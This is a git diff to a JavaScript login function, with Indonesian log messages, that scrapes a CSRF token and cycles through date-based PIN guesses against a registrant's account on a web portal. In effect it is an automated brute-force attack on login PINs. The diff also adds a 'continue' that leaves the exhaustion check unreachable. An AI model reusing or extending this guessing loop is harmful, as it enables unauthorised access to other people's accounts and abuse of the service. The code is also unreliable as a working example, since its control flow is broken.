@@ -101,7 +101,7 @@ async function login(idpendaftar, nama, startss, endss, nomor) {
       const { data: html } = await client.get('/login');
       const tokenMatch = html.match(/name="_token"\s+value="([^"]+)"/);
       if (!tokenMatch) {
-        //console.log('CSRF token tidak ditemukan di halaman login');
+        console.log('CSRF token tidak ditemukan di halaman login');
         continue;
       }
       let token = tokenMatch[1];
@@ -135,6 +135,10 @@ async function login(idpendaftar, nama, startss, endss, nomor) {
         }
       });
       job.statusData.status = res.status;
+      if (res.status !== 200) {
+        job.statusData.html = res.data;
+        continue;
+      }
       
       const finalUrl = res.request?.res?.responseUrl ?? res.config.url;
       if (!finalUrl.includes('/login')) {
@@ -146,6 +150,7 @@ async function login(idpendaftar, nama, startss, endss, nomor) {
       } else {
         //console.log(`PIN ${pin} salah.. Skip..`);
         pin = g.next();
+        continue;
         if (pin === null) {
           console.log("Sudah mencoba semua kombinasi tanggal, tidak ada yang cocok. Skipped..");
           g.reset();
